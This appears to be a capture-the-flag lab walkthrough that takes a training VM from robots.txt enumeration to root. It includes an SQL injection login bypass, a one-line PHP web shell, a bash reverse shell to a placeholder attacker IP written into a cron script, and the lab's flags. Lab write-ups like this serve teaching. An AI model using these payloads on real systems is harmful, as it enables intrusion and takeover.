## Medium Lab - Complete Walkthrough

This document outlines the intended solution path for the Medium Lab.

### 1. Enumeration & Flag 1

* **Action:** Browse to the web server's IP. You will see a login page. A common enumeration step is to check for a `robots.txt` file.
* **Result:** Navigating to `http://<TARGET_IP>/robots.txt` reveals a disallowed entry: `/users.xml`.
* **Action:** Navigate to `http://<TARGET_IP>/users.xml`.
* **Result:** This file contains a list of potential usernames, including `admin426`. The first flag is also located in the webroot.
* **Flag 1:** `OmahTIAcademy{R0bot5_Fl@g}` (Found at `http://<TARGET_IP>/flag1.txt`)

### 2. SQL Injection & Flag 2

* **Action:** Use the discovered username (`admin426`) with a classic SQL injection payload to bypass the login.
    * **Username:** `admin426' OR 1=1#`
    * **Password:** (leave blank)
* **Result:** You are successfully logged in and redirected to the profile page.
* **Flag 2:** The page displays the second flag: `OmahTIAcademy{SQL_L0g1n_Byp@ss}`.

### 3. File Upload & Flag 3

* **Action:** The profile page has a file upload feature. Upload a simple PHP web shell.
    ```php
    <?php system($_REQUEST['cmd']); ?>
    ```
* **Result:** The file is uploaded successfully. Access it via the URL (`http://<TARGET_IP>/uploads/shell.php?cmd=ls`) to get command execution.
* **Action:** Explore the `/uploads` directory with your new shell.
    ```
    ls -la /var/www/html/uploads
    ```
* **Result:** You will find `admin_password.txt` and `flag3.txt`.
* **Flag 3:** `OmahTIAcademy{F1l3_Uplo@d_@ttacks}`
* **Credentials:** Reading `admin_password.txt` reveals the SSH password for `admin426`.

### 4. Privilege Escalation & Flag 4

* **Action:** Use the discovered password to SSH into the machine as `admin426`.
* **Action:** Enumerate for privilege escalation vectors. `linpeas.sh` will highlight a world-writable cron job script at `/usr/local/bin/backup.sh`.
* **Action:** Overwrite the script with a reverse shell payload and start a listener on your attacker machine.
    ```bash
    # On attacker machine
    nc -lvnp 4444

    # On victim machine (as admin426)
    echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > /usr/local/bin/backup.sh
    ```
* **Result:** Within one minute, you will receive a root shell on your listener.
* **Flag 4:** `cat /root/flag4.txt`
